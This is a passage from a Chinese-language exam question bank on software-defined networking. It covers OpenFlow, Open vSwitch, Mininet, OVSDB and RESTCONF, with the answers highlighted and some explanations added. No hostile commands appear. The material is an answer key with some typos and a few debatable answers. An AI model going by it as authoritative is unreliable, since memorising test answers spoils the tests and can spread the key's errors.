错</strong></p><p><strong>73.OpenFlow v1.3中交换机必须支持所有的计数器。</strong></p><p> <strong>对  <font style="background: yellow ">错</font></strong></p><p><strong><code>解析：交换机不要求支持所有的计数器，只有那些标记为“Required”是必须支持的</code></strong></p><p><strong>74.流表项被删除时，无论是控制器控制或流表项超时机制，交换机必须检查流表项的OFPFF_SEND_FLOW_REM标志。</strong></p><p> <strong><font style="background: yellow ">对</font>  错</strong></p><p><strong>75.OpenFlow v1.3中，table-miss表项指定在流表中如何处理与其他流表项未匹配的数据包。</strong></p><p> <strong><font style="background: yellow ">对</font>  错</strong></p><p><strong>76.在OpenFlow v1.3流表处理过程中，多个flow tables是依次排列的，序号从1开始。</strong></p><p> <strong>对  <font style="background: yellow ">错</font></strong></p><p><strong><code>解析：在OpenFlow v1.3流表处理过程中，多个flow tables是依次排列的，序号从0开始。</code></strong></p><p><strong>77.OpenFlow v1.3协议中的交换机含有多个流表，每个流表中含有多个流表项，每个流表项包含一个匹配项及对应的指令。</strong></p><p> <strong>对  <font style="background: yellow ">错</font></strong></p><p><strong><code>解析：OF1.3协议中的交换机含有多个流表，每个流表中含有多个流表项，每个流表项包含多个匹配项及对应的指令。</code></strong></p><p><strong>78.OpenFlow v1.3中每台OpenFlow交换机只有一张流表。</strong></p><p> <strong>对  <font style="background: yellow ">错</font></strong></p><p><strong>79.Flow-mod消息中的idle_time表示当这条流表项在规定的时间内没有匹配到数据分组，则该流表项失效。</strong></p><p> <strong><font style="background: yellow ">对</font>  错</strong></p><p><strong>80.Flow-mod消息中command字段表示对流表的操作，包括增加（Add）、删除（Delete）、修改（Modify）等。</strong></p><p> <strong><font style="background: yellow ">对</font>  错</strong></p><p><strong>81.Packet-out中的reason字段表示发送Packet-out消息的原因。</strong></p><p> <strong>对  <font style="background: yellow ">错</font></strong></p><p><strong>82.用于SDN交换机链路发现的LLDP报文封装在Packet-in&#x2F;Packet-out消息中。</strong></p><p> <strong><font style="background: yellow ">对</font>  错</strong></p><p><strong>83.OpenFlow v1.0中增加了组表（Group Table）的概念。</strong></p><p> <strong>对  <font style="background: yellow ">错</font></strong></p><p><strong>84.Flow-mod消息中，idle_time和hard_time同时设置时，以hard_time设置的时间为准。</strong></p><p> <strong>对  <font style="background: yellow ">错</font></strong></p><p><strong><code>解析：idle_time和hard_time给出了该流表项的生存时间，其中idle_time表示当这条流表项在这段时间内没有匹配到数据分组，则该流表项失效，hard_time表示自流表项下发后只要过了这段时间即刻失效；两者同时设置时，以先到的生存时间为准；两者同时为0时，流表项不会自动失效。</code></strong></p><p><strong>85.命令 sudo mn –topo tree, fanout&#x3D;2,depth&#x3D;2所创建的拓扑中交换机个数为2个，主机个数为4个。</strong></p><p> <strong>对  <font style="background: yellow ">错</font></strong></p><p><strong>86.命令sudo mn –topo linear,4表示创建一个4个主机，1个交换机的拓扑。</strong></p><p> <strong>对  <font style="background: yellow ">错</font></strong></p><p><strong>87.Mininet支持创建的网络拓扑有：minimal、single、linear和tree等。</strong></p><p> <strong><font style="background: yellow ">对</font>  错</strong></p><p><strong>88.SDN的编程接口主要体现在北向接口上，北向接口提供了一系列丰富的API，开发者可以在此基础上设计自己的应用而不必关心底层的硬件细节</strong></p><p> <strong><font style="background: yellow ">对</font>  错</strong></p><p><strong>89.SDN北向接口是通过控制器向上层业务应用开放的接口，其目标是使得业务应用能够便利地调用底层的网络资源和能力。</strong></p><p> <strong><font style="background: yellow ">对</font>  错</strong></p><p><strong>90.基于REST构建的API就是Restful风格。</strong></p><p> <strong><font style="background: yellow ">对</font>  错</strong></p><p><strong>91.OVSDB-Server表示OVS的数据库服务进程，用于存储虚拟交换机的配置信息（比如网桥、端口等），为控制器和OVS-vSwitchd提供OVSDB操作接口。</strong></p><p> <strong><font style="background: yellow ">对</font>  错</strong></p><p><strong>92.下面对Postman中form-data、x-www-form-urlencoded、raw、和binary四种形式描述不正确的是（）</strong></p><p><strong>A、form-data主要用于上传文件</strong></p><p><strong>B、x-www-form-urlencoded是表单常用的格式</strong></p><p> <strong><font style="background: yellow ">C、raw可以用来上传HTML数据</font></strong></p><p><strong>D、binary用于二进制格式的数据</strong></p><p><strong><code>解析：raw可以用来上传JSON数据。</code></strong></p><p><strong>93.当控制器与交换机通过OVSDB协议建立连接后，控制器会侦听6633端口。</strong></p><p> <strong>对  <font style="background: yellow ">错</font></strong></p><p><strong>94.Restful风格的数据元操作分别对应HTTP方法：GET用来获取资源，POST用来更新资源，PUT用来新建资源，DELETE用来删除资源</strong></p><p> <strong>对  <font style="background: yellow ">错</font></strong></p><p><strong>95.流表由很多个流表项组成，每个流表项就是一个转发规则。</strong></p><p> <strong><font style="background: yellow ">对</font>  错</strong></p><p><strong>96.下面对OpenvSwitch各模块描述不正确的是（）</strong></p><p><strong>A、ovs-vswitchd：主要模块，实现vswitch的守候进程daemo</strong></p><p><strong>B、ovsdb-server：轻量级数据库服务器，保存配置信息</strong></p><p><strong>C、ovs-dpctl：用来配置vswitch内核模块的一个工具</strong></p><p> <strong><font style="background: yellow ">D、ovs-vsctl：查询和控制OpenFlow虚拟交换机的流表</font></strong></p><p><strong>97.OpenvSwitch架构包含了哪几个部分（）</strong></p><p><strong>A、网桥、端口、链路</strong></p><p> <strong><font style="background: yellow ">B、内核空间、用户空间、配置管理层</font></strong></p><p><strong>C、CPU、RAM、ROM</strong></p><p><strong>D、学习、存储、转发</strong></p><p><strong>98.既可以使用Postman发送RESTCONF消息来查询交换机组表，也可以直接登录交换机通过命令ovs-ofctl dump-groups来查看交换机组表。</strong></p><p>  <strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>99.GRE协议封装的有效载荷必须是IP数据包。</strong></p><p> <strong>对   <font style="background: yellow ">错</font></strong></p><p><strong>100.启动Open vSwitch daemon时执行命令（）</strong></p><p><strong>A、ovs-vsctl –no-wait init</strong></p><p> <strong><font style="background: yellow ">B、ovs-vswitchd –pidfile –detach</font></strong></p><p><strong>C、insmod .&#x2F;datapath&#x2F;linux&#x2F;openvswitch.ko</strong></p><p><strong>D、ovsdb-server –pidfile –detach</strong></p><p><strong>101.GRE采用了Tunnel技术，提供了一条通路使封装的数据报文能够在Tunnel上传输，并且在一个Tunnel的两端分别对数据报进行封装及解封装。</strong></p><p> <strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>102.交换机和网桥属于OSI模型的哪一层（）</strong></p><p> <strong><font style="background: yellow ">A、数据链路层</font></strong></p><p><strong>B、传输层</strong></p><p><strong>C、网络层</strong></p><p><strong>D、会话层</strong></p><p><strong>103.OpenFlow交换机接收到数据包后，首先在本地的流表上查找转发目标端口，如果没有匹配，则把数据包转发给Controller，由控制层决定转发端口。</strong></p><p> <strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>104.VxLAN通过24比特的VNI可以支持多达16M的VxLAN段的网络隔离，对用户进行隔离和标识不再受到限制，可满足海量租户。</strong></p><p> <strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>105.以下关于ovs-vsctl网桥管理常用命令使用错误的一项是（）</strong></p><p><strong>A、命令add-br BRIDGE：添加新的网桥</strong></p><p> <strong><font style="background: yellow ">B、命令list-br：打印网桥中所有port摘要信息</font></strong></p><p><strong>C、命令get-controller BRIDGE：获取网桥的控制器信息</strong></p><p><strong>D、命令set-controller BRIDGE TARGET：向网桥添加控制器</strong></p><p><strong>106.流表的下发可以是主动的，也可以是被动的。</strong></p><p>  <strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>107.SDN的意义在于削弱底层基础设施的作用，利用软件可以实时地对其进行重新配置和编程。</strong></p><p>  <strong><font style="background: yellow "> 对</font> 错</strong></p><p><strong>108.OpenvSwitch流表管理常用命令使用错误的是（）</strong></p><p> <strong><font style="background: yellow ">A、ovs-ofctl dump-flows SWITCH：输出交换机中匹配的流表项</font></strong></p><p><strong>B、ovs-ofctl add-flow SWITCH FLOW：向交换机添加流表项</strong></p><p><strong>C、ovs-ofctl mod-flows SWITCH FLOW：修改交换机的流表项</strong></p><p><strong>D、ovs-ofctl del-flows SWITCH FLOW：删除交换机的流表项</strong></p><p><strong>109.Postman可以自由设定变量与环境，并且把变量保存在不同的环境中。</strong></p><p>  <strong><font style="background: yellow "> 对</font> 错</strong></p><p><strong>110.在网络中以下哪个选项的措施不能用来提高服务质量（）</strong></p><p>  <strong><font style="background: yellow "> A、降低传输的带宽</font></strong></p><p><strong>B、降低传送的时延</strong></p><p><strong>C、降低数据的丢包率</strong></p><p><strong>D、降低数据的时延抖动</strong></p><p><strong>111.OpenvSwitch中的网桥对应物理交换机，其功能是根据一定流规则，把从端口收到的数据包转发到另一个或多个端口。</strong></p><p>  <strong><font style="background: yellow "> 对</font> 错</strong></p><p><strong>112.OpenvSwitch提供了对OpenFlow协议的支持，用户可以使用任何支持OpenFlow协议的控制器对OVS进行远程管理控制。</strong></p><p><strong><font style="background: yellow "> 对</font> 错</strong></p><p><strong>113.常见的南向接口协议有：OpenFlow、RESTCONF、OVSDB、OF-CONFIG和NETCONF</strong></p><p> <strong>对 <font style="background: yellow ">错</font></strong></p><p><strong>114.OpenFlow网络由OpenFlow交换机、网络虚拟化层和控制器三部分组成。</strong></p><p><strong><font style="background: yellow "> 对</font> 错</strong></p><p><strong>115.OpenFlow交换机利用基于安全连接的OpenFlow协议与控制器互相通信。</strong></p><p><strong><font style="background: yellow "> 对</font> 错</strong></p><p><strong>116.OpenFlow交换机只有一张流表，这张流表中存储着许多的流表项。</strong></p><p> <strong>对 <font style="background: yellow ">错</font></strong></p><p><strong>117.控制器下发流表主要有两种模式，分别是reactive模式和proactive模式，proactive模式的设置必须在控制器与交换机建立连接后立刻下发流表。</strong></p><p> <strong>对 <font style="background: yellow ">错</font></strong></p><p><strong>118.OpenFlow协议下，OpenDaylight可以给OpenvSwitch下发流表。OVSDB协议下，OpenDaylight可以用来配置OpenvSwitch，包括创建bridge和port等。</strong></p><p><strong><font style="background: yellow "> 对</font> 错</strong></p><p><strong>119.OF-CONFIG的本质是提供一个开放接口，主要用于控制OpenFlow交换机以及远程配置。</strong></p><p><strong><font style="background: yellow "> 对</font> 错</strong></p><p><strong>120.云计算的发展，是以虚拟化技术为基础的。</strong></p><p><strong><font style="background: yellow "> 对</font> 错</strong></p><p><strong>121.SDN即OpenFlow。</strong></p><p> <strong>对 <font style="background: yellow ">错</font></strong></p><p><strong>122.在OpenFlow1.0中不仅存在流表的概念，也包含组表的概念。</strong></p><p><strong>对 <font style="background: yellow ">错</font></strong></p><p><strong>123.OpenFlow1.0协议不支持多级流表。</strong></p><p> <strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>124.OpenFlow交换机通过使用OpenFlow协议的安全通道与控制器进行通信。</strong></p><p> <strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>125.OpenFlow1.3中流表包括三个字段：包头域、计数器以及行动。</strong></p><p> <strong>对 <font style="background: yellow ">错</font></strong></p><p><strong>126.OpenFlow1.3开始引入组表以及计量表的概念。</strong></p><p> <strong>对 <font style="background: yellow ">错</font></strong></p><p><strong>127.从OpenFlow1.1开始，控制器与交换机之间的安全通道既可以使用TLS安全隧道，也可以选择普通TCP连接。</strong></p><p> <strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>128.OVSDB管理协议是VMware公司提出的负责管理OVS数据库的协议，OVSDB管理协议定义了一套RPC接口，用户可通过远程调用的方式管理OVSDB。</strong></p><p> <strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>129.OpenFlow1.3的协议交互过程依靠OFPT_MULTIPART_REQUEST与REPLY消息上报交换机端口相关信息，而非Features消息。</strong></p><p> <strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>130.OVSDB数据库由两个主要部分构成，即ovsdb-server和ovsdb-client。</strong></p><p><strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>131.OF-CONFIG与OpenFlow之间存在着密切的关系，因此随着OpenFlow标准的演进，OF-CONFIG的版本也在不断跟进。</strong></p><p><strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>132.关于Mininet架构说法不正确的是（）</strong></p><p><strong>A、按datapath的运行权限不同，分为kernel datapath和userspace datapath两种</strong></p><p><strong>B、kernel datapath把分组转发的逻辑编译进入Linux内核，效率非常高</strong></p><p><strong><font style="background: yellow ">C、userspace datapath把分组转发逻辑实现为一个应用程序，叫做ofdatapath，效率比kernel datapath高</font></strong></p><p><strong>D、Mininet除了支持kernel datapath和userspace datapath这两种架构以外，还支持OVS交换机</strong></p><p><strong>133.Mininet作为一个轻量级软定义网络研发和测试平台，其主要特性包括灵活性、可移植性 、可扩展性、真实性和共享性。</strong></p><p><strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>134.以下Mininet内部交互命令中使用错误的是（）</strong></p><p><strong>A、命令pingall：所有主机节点之间互Ping</strong></p><p><strong><font style="background: yellow ">B、命令iperf：两个节点之间用制定带宽UDP进行测试</font></strong></p><p><strong>C、命令nodes：列出所有的节点信息</strong></p><p><strong>D、命令py net.get(‘h3’).cmd(‘ifconfig h3-eth0 10.3’)：给h3赋予IP（10.0.0.3）</strong></p><p><strong><code>解析：iperf：两个节点之间进行TCP测试。</code></strong></p><p><strong>135.使用Python脚本创建拓扑，具体脚本内容如下所示，对该脚本描述错误的是（）</strong></p><p><strong>from mininet.net import Mininet</strong><br><strong>from mininet.topolib import TreeTopo</strong><br><strong>Tree22 &#x3D; TreeTopo(depth&#x3D;2,fanout&#x3D;3)</strong><br><strong>net &#x3D; Mininet(topo&#x3D;Tree22)</strong><br><strong>net.start()</strong><br><strong>net.pingAll()</strong><br><strong>net.stop()</strong></p><p><strong>A、该脚本创建深度为2，每层树枝为3的树型拓扑</strong></p><p><strong>B、拓扑构建完成后执行主机间的pingall操作</strong></p><p><strong><font style="background: yellow ">C、该拓扑包括1个交换机和2个主机</font></strong></p><p><strong>D、执行pingall操作后停止操作</strong></p><p><strong><code>解析：该拓扑包括4个交换机和9个主机。</code></strong></p><p><strong>136.关于Mininet可视化工具MiniEdit描述错误的是（）</strong></p><p><strong>A、使用Mininet可视化界面方便了用户自定义拓扑创建，为不熟悉Python脚本的使用者创造了更简单的环境，界面直观，可操作性强</strong></p><p><strong><font style="background: yellow ">B、执行命令sudo ~&#x2F;mininet&#x2F;examples&#x2F;miniedit.py可运行Mininet</font></strong></p><p><strong>C、MiniEdit的用户界面在画布的左侧显示一排工具图标，并在窗口顶部显示一个菜单栏</strong></p><p><strong>D、Mininet的可视化界面可进行自定义拓扑和自定义设置</strong></p><p><strong><code>解析：执行命令sudo ~/mininet/examples/miniedit.py可运行MiniEdit。</code></strong></p><p><strong>137.MAC地址表记录的内容是（）</strong></p><p><strong><font style="background: yellow ">A、主机MAC地址与交换机接口的对应关系</font></strong></p><p><strong>B、主机MAC地址与IP地址的对应关系</strong></p><p><strong>C、主机MAC地址与下一跳IP地址的对应关系</strong></p><p><strong>D、交换机接口与下一跳IP地址的对应关系</strong></p><p><strong>138.如果交换机MAC表中没有数据帧中目标MAC地址的信息，交换机会如何处理（）</strong></p><p><strong><font style="background: yellow ">A、将该数据帧从非接受接口发送出去（也就是广播）</font></strong></p><p><strong>B、查找路由表</strong></p><p><strong>C、根据MAC表中记录的对应接口将数据帧发送出去（也就是单播）</strong></p><p><strong>D、以上说法都不对</strong></p><p><strong>139.OpenDaylight提供的基础网络服务功能不包括（）</strong></p><p><strong>A、拓扑管理</strong></p><p><strong>B、交换机管理</strong></p><p><strong>C、主机检测</strong></p><p><strong><font style="background: yellow ">D、路由器管理</font></strong></p><p><strong>140.Postman发送请求时，Body体的编辑方式不支持（）</strong></p><p><strong>A、form-data</strong></p><p><strong>B、x-www-form-urlencoded</strong></p><p><strong>C、raw</strong></p><p><strong><font style="background: yellow ">D、pretty</font></strong></p><p><strong><code>解析：Postman根据Body Type的不同，提供了4种编辑方式：form-data，x-www-form-urlencoded，raw，binary。</code></strong></p><p><strong>141.下面关于匹配域解析流程说法错误的是（）</strong></p><p><strong><font style="background: yellow ">A、当SDN交换机接收到一个数据包时，将按照优先级从table1依次匹配其本地保存的流表中的表项</font></strong></p><p><strong>B、如果是VLAN数据包，那么匹配字段就会包含VLAN ID和PCP</strong></p><p><strong>C、如果是ARP数据包，那么匹配字段就会包含IP源和目的地址</strong></p><p><strong>D、如果是IP数据包，那么匹配字段就会包含IP首部</strong></p><p><strong><code>解析：当SDN交换机接收到一个数据包时，将按照优先级从table0依次匹配其本地保存的流表中的表项。</code></strong></p><p><strong>142.对于单点对单点的intents，每个intents在SDN网络中连接两个连接点。每个连接点包含（）信息</strong></p><p><strong>A、SDN交换机的DPID</strong></p><p><strong>B、交换机Port</strong></p><p><strong>C、连接的BGP Speaker路由器的MAC地址</strong></p><p><strong><font style="background: yellow ">D、以上都是</font></strong></p><p><strong>143.以下不属于OpenFlow协议消息类型的是（）</strong></p><p><strong><font style="background: yellow ">A、Synchronou</font></strong></p><p><strong>B、Controller-to-Switch</strong></p><p><strong>C、Asynchronous</strong></p><p><strong>D、Symmetric</strong></p><p><strong>144.流表项中的“头字段”描述了该流表项与何种数据包进行匹配，以下（）不属于头字段（）</strong></p><p><strong><font style="background: yellow ">A、IP type</font></strong></p><p><strong>B、Ethernet source address</strong></p><p><strong>C、VLAN id</strong></p><p><strong>D、Ingress port</strong></p><p><strong><code>解析：IP type不属于头字段要素。Ethernet source address表示以太网帧的发送源以太网地址，VLAN id表示VLAN标签的VID，Ingress port表示输入端口。</code></strong></p><p><strong>145.关于OpenFlow流表描述不正确的是（）</strong></p><p><strong>A、流表项主要由3部分组成，分别是分组头域（Head Field），计数器（Counter）和动作表（Action）</strong></p><p><strong>B、一个数据分组进入OF交换机后需要先匹配流表，若符合其中某条表项的特征，则按照相应的动作进行转发</strong></p><p><strong>C、一个数据分组进入OF交换机后需要先匹配流表，若没有匹配某条表项的特征，则封装为Packet-in消息通过安全通道交给控制器，再由控制器决定如何处理</strong></p><p><strong><font style="background: yellow ">D、每条流表项会永久存在，不会自动删除</font></strong></p><p><strong>146.关于Packet-out消息描述不正确的是（）</strong></p><p><strong>A、Packet-out消息可以用于指定某一个数据包的处理方法</strong></p><p><strong>B、控制器可以使用Packet-out消息，告诉交换机网络中如ARP、IGMP等数据包如何处理</strong></p><p><strong>C、Packet-out消息由OpenFlow控制器发出并发送到OpenFlow交换机</strong></p><p><strong><font style="background: yellow ">D、当用于链路发现时，控制器向一个交换机发送Packet-out消息，actions为从交换机的所有端口转发</font></strong></p><p><strong>147.关于Port-Status消息说法不正确的是（）</strong></p><p><strong>A、在OpenFlow交换机中添加、删除或修改物理端口时，需要发送Port-Status消息来通知OpenFlow控制器</strong></p><p><strong><font style="background: yellow ">B、reason包括OFPPR_ADD（0）和OFPPR_DELETE（1）</font></strong></p><p><strong>C、Port字段描述了端口的具体信息，如端口号、端口的MAC地址、端口名称、端口配置、端口状态等</strong></p><p><strong>D、OFPT_PORT_STATUS：表明是Port-Status消息</strong></p><p><strong><code>解析：reason包括OFPPR_ADD（0）、OFPPR_DELETE（1）、OFPPR_MODIFY（2）。</code></strong></p><p><strong>148.关于Role消息说法不正确的是（）</strong></p><p><strong>A、控制器具有三种Role：EQUAL、MASTER、SLAVE</strong></p><p><strong>B、MASTER具有和EQUAL完全相同的权限</strong></p><p><strong>C、只能同时存在1台MASTER。Role可以进行变更</strong></p><p><strong><font style="background: yellow ">D、OpenFlow交换机一端可以随意决定Role</font></strong></p><p><strong>149.关于Barrier消息说法不正确的是（）</strong></p><p><strong>A、Barrier请求消息和与其相应的Barrier响应消息都只有OpenFlow消息头，不包含消息体</strong></p><p><strong>B、控制器向交换机发送一个Barrier请求，要求等xid数值以前的处理全部完成后，返回Barrier响应</strong></p><p><strong>C、交换机会先处理Barrier请求前的所有消息，当操作全部完成后返回一个Barrier响应消息给控制器，表明操作已经结束</strong></p><p><strong><font style="background: yellow ">D、返回Barrier响应消息中不携带xid</font></strong></p><p><strong>150.关于组表结构描述不正确的为（）</strong></p><p><strong>A、组ID：用于表示组的识别符，根据该识别符使用各组</strong></p><p><strong>B、组类型：指定组的动作，分为all、select、indirect、fast failover四种</strong></p><p><strong>C、计数器：记录通过该组表项处理的数据包数</strong></p><p><strong><font style="background: yellow ">D、行动桶：多个行动数据桶，各行动数据桶存储了一个执行动作和其对应的参数</font></strong></p><p><strong>151.关于不同类型的组类型的实现与功能，描述不正确的是（）</strong></p><p><strong>A、Group Table中所有的Action Buckets都会被执行</strong></p><p><strong>B、elect：仅仅执行Group Table中的某一个Action Bucket</strong></p><p><strong><font style="background: yellow ">C、indirect：执行Group Table中已经定义好的Action Bucket，可以支持多个Action Bucket</font></strong></p><p><strong>D、fast failover：执行第一个“激活的”Action Bucket</strong></p><p><strong><code>解析：indirect：执行Group Table中已经定义好的Action Bucket，只支持一个Action Bucket。</code></strong></p><p><strong>152.在交换机s1中添加组表项，设置组表的组ID为1，组类型为all。第一个行动桶为：从2号端口输出，第二个行动桶为：从1号端口输出。以下写法正确的是（）</strong></p><p><strong><font style="background: yellow ">A、命令：sh ovs-ofctl -O OpenFlow13 add-group s1 group_id&#x3D;1,type&#x3D;all,bucket&#x3D;output:2,bucket&#x3D;output:1</font></strong></p><p><strong>B、命令：sh ovs-ofctl -O OpenFlow13 add-group s1 group_id&#x3D;1,type&#x3D;all,bucket&#x3D;output:1,bucket&#x3D;output:2</strong></p><p><strong>C、命令：sh ovs-ofctl -O OpenFlow13 add-group s1 group_id&#x3D;2,type&#x3D;all,bucket&#x3D;output:2,bucket&#x3D;output:1</strong></p><p><strong>D、命令：sh ovs-ofctl -O OpenFlow13 add-group s1 group_id&#x3D;1,type&#x3D;select,bucket&#x3D;output:1,bucket&#x3D;output:2</strong></p><p><strong>153.关于LLDP协议说法不正确的是（）</strong></p><p><strong>A、LLDP是二层链路发现协议</strong></p><p><strong>B、LLDP协议使得接入网络的一台设备可以将管理地址、设备标识和接口标识等信息发送给接入同一个局域网络的其它设备</strong></p><p><strong><font style="background: yellow ">C、LLDP协议可以对远端设备进行配置</font></strong></p><p><strong>D、LLDP协议提供了关于网络拓扑以及管理配置的信息</strong></p><p><strong>154.关于控制器流表下发proactive模式说法不正确的是（）</strong></p><p><strong>A、OpenFlow交换机和控制器建立连接后，由控制器向交换机预先发送流表项的方式称之为proactive模式</strong></p><p><strong>B、proactive模式的设置不是必须在控制器与交换机建立连接后立刻下发流表，可以在连接建立后的任意时间下发流表</strong></p><p><strong>C、proactive模式下控制器主动下发流表给交换机，随后交换机可以直接根据流表进行转发</strong></p><p><strong><font style="background: yellow ">D、proactive模式下控制器的压力会大大减轻，可以有效的节省TCAM的空间</font></strong></p><p><strong>155.关于控制器流表下发reactive模式说法不正确的是（）</strong></p><p><strong><font style="background: yellow ">A、OpenFlow交换机接收到未知数据包时，会向控制器发送一条Packet_out消息询问控制器如何处理该数据包</font></strong></p><p><strong>B、控制器接收到交换机询问消息后，计算路径并发送一条Flow_Mod消息指示交换机如何处理该数据包</strong></p><p><strong>C、当老化定时器超时后就可以删除与该数据包相关的流表项</strong></p><p><strong>D、OpenFlow交换机无需维护全部流表，只有当未知数据包到达交换机时才会触发reactive模式</strong></p><p><strong>156.关于OVSDB协议描述不正确的为（）</strong></p><p><strong>A、是一种管理配置协议，负责添加、删除、更新端口和隧道</strong></p><p><strong>B、具有灵活易懂、可扩展性强的特点</strong></p><p><strong>C、控制平面可以通过OVSDB Mgmt远程配置OVS的数据库OVSDB</strong></p><p><strong><font style="background: yellow ">D、OVSDB管理协议是目前为止唯一的OpenFlow配置协议</font></strong></p><p><strong>157.OVSDB协议对应的侦听端口为（）</strong></p><p><strong><font style="background: yellow ">A、6640</font></strong></p><p><strong>B、6633</strong></p><p><strong>C、6632</strong></p><p><strong>D、6642</strong></p><p><strong>158.结合如下Body体中的内容，关于利用OVSDB创建网桥说法正确的是（）</strong></p><p><strong>{</strong><br>    <strong>“row”: {</strong><br>    <strong>“Bridge”: {</strong><br>     <strong>“name”: “br0”,</strong><br>      <strong>“datapath_type”: “OpenFlow13”</strong><br>    <strong>}</strong><br>  <strong>}</strong><br><strong>}</strong></p><p><strong>A、在Postman上通过发送PUT请求创建网桥</strong></p><p><strong>B、创建了一个名为br1的网桥</strong></p><p><strong>C、创建的网桥与控制器通过OpenFlow10进行连接</strong></p><p><strong><font style="background: yellow ">D、网桥创建成功后，Postman上返回所创建网桥的UUID</font></strong></p><p><strong><code>解析：A：通过发送POST请求创建网桥；B：创建了一个名为br0的网桥；C：创建的网桥与控制器通过OpenFlow13进行连接。</code></strong></p><p><strong>159.关于利用OVSDB创建端口说法错误的是（）</strong></p><p><strong>A、创建端口前必须要先获知网桥的UUID</strong></p><p><strong><font style="background: yellow ">B、在Postman上通过发送PUT请求创建端口</font></strong></p><p><strong>C、端口创建成功后，Postman上返回所创建端口的UUID</strong></p><p><strong>D、OVSDB创建端口后可在相应的交换机上查看是否有对应的端口创建成功</strong></p><p><strong>160.关于OF-CONFIG协议说法错误的是（）</strong></p><p><strong>A、控制器可以用OF-CONFIG协议来管理和配置OF交换机</strong></p><p><strong>B、OF-CONFIG v1.1.1协议版本增加对OpenFlow v1.3.1协议的支持</strong></p><p><strong><font style="background: yellow ">C、OF-CONFIG可以影响流表的内容和数据转发行为</font></strong></p><p><strong>D、OF-CONFIG可以在OF交换机上配置控制器IP地址、配置交换机端口上的队列等操作</strong></p><p><strong>161.关于OF-CONFIG说法正确的是（）</strong></p><p><strong>A、OF-CONFIG全称是OpenFlow Configuration and Management Protocol</strong></p><p><strong>B、OF-CONFIG最主要的设计目标是协助OpenFlow协议</strong></p><p><strong>C、OF-CONFIG的作用是提供一个开放接口用于远程管理和配置OF交换机</strong></p><p><strong>D、以上均正确</font></strong></p><p><strong>162.RESTCONF支持的HTTP请求方法不包括（）</strong></p><p><strong>A、GET</strong></p><p><strong>B、PUT</strong></p><p><strong><font style="background: yellow ">C、SET</font></strong></p><p><strong>D、DELETE</strong></p><p><strong>163.RESTCONF消息的Body体支持以下哪种格式（）</strong></p><p><strong>A、GIF</strong></p><p><strong>B、JPEG</strong></p><p><strong>C、TXT</strong></p><p><strong><font style="background: yellow ">D、JSON</font></strong></p><p><strong>164.查看OpenDaylight资源点moudles时，请求的方法应为（）</strong></p><p><strong>A、POST</strong></p><p><strong>B、PUT</strong></p><p><strong><font style="background: yellow ">C、GET</font></strong></p><p><strong>D、DELETE</strong></p><p><strong>165.OpenDayLight提供的北向接口模块可以分为（）</strong></p><p><strong>A、平台服务类</strong></p><p><strong>B、拓展类</strong></p><p><strong>C、网络服务类</strong></p><p><strong><font style="background: yellow ">D、以上三项</font></strong></p><p><strong>166.OpenDaylight的Topology模块对应哪些子资源节点（）</strong></p><p><strong><font style="background: yellow ">A、OPERATIONAL和CONFIG</font></strong></p><p><strong>B、TOPOLOGY</strong></p><p><strong>C、OPERATIONAL</strong></p><p><strong>D、CONFIG</strong></p><p><strong>167.组表项不包含以下哪个字段（）</strong></p><p><strong>A、Group Identifier</strong></p><p><strong>B、Group Type</strong></p><p><strong><font style="background: yellow ">C、Priority</font></strong></p><p><strong>D、Action Bucket</strong></p><p><strong>168.使用Postman下发组表需要借助的北向接口模块为（）</strong></p><p><strong>A、network-opology</strong></p><p><strong><font style="background: yellow ">B、opendaylight-inventory</font></strong></p><p><strong>C、node-config</strong></p><p><strong>D、openflow-actio</strong></p><p><strong>169.GRE封装数据包从逻辑上可以分为哪些部分（）</strong></p><p><strong>A、Delivery Header</strong></p><p><strong>B、GRE Header</strong></p><p><strong>C、Payload Packet</strong></p><p><strong><font style="background: yellow ">D、以上三项</font></strong></p><p><strong>170.如果将IPv4数据包进行GRE封装，GRE头部字段的协议类型的值应为（）</strong></p><p><strong><font style="background: yellow ">A、0x0800</font></strong></p><p><strong>B、0x0806</strong></p><p><strong>C、0x8000</strong></p><p><strong>D、0x8809</strong></p><p><strong>171.VxLAN采用的封装格式为（）</strong></p><p><strong>A、MAC in TCP</strong></p><p><strong><font style="background: yellow ">B、MAC in UDP</font></strong></p><p><strong>C、IP in UDP</strong></p><p><strong>D、通用封装协议，无格式要求</strong></p><p><strong>172.数据中心内的交换机依据部署位置可以划分为（）</strong></p><p><strong>A、边缘交换机</strong></p><p><strong>B、核心交换机</strong></p><p><strong>C、聚合交换机</strong></p><p><strong><font style="background: yellow ">D、以上三项</font></strong></p><p><strong>173.下面不属于Postman响应Body体视图模式的是（）</strong></p><p><strong><font style="background: yellow ">A、Binary</font></strong></p><p><strong>B、Pretty</strong></p><p><strong>C、Raw</strong></p><p><strong>D、Preview</strong></p><p><strong>174.在OpenvSwitch中，下面能实现交换功能的模块是（）</strong></p><p><strong>A、ovs-controller</strong></p><p><strong>B、ovs-vsctl</strong></p><p><strong><font style="background: yellow ">C、ovs-vswitchd</font></strong></p><p><strong>D、ovs-ofctl</strong></p><p><strong>175.在OpenvSwitch中，下列命令解释错误的是（）</strong></p><p><strong>A、ovs-vsctl list-br：列出所有的网桥</strong></p><p><strong>B、ovs-vsctl add-br br0：添加网桥</strong></p><p><strong><font style="background: yellow ">C、ovs-ofctl show br0：列出交换机中匹配的流表</font></strong></p><p><strong>D、ovs-ofctl del-flows br0：删除所有的流表</strong></p><p><strong>176.OpenvSwitch交换机中查看网桥br-sw上流表的命令是：ovs-vctl dump-flows br-sw。</strong></p><p> <strong>对 <font style="background: yellow ">错</font></strong></p><p><strong>177.OpenFlow Echo消息用来确认控制器和交换机之间是否连接、检测通信延迟、测量通信带宽等。</strong></p><p> <strong><font style="background: yellow ">对</font> 错</strong></p><p><strong>178.下图中封包详细信息界面中的Frame表示物理层的数据概况。</strong><br><strong><img 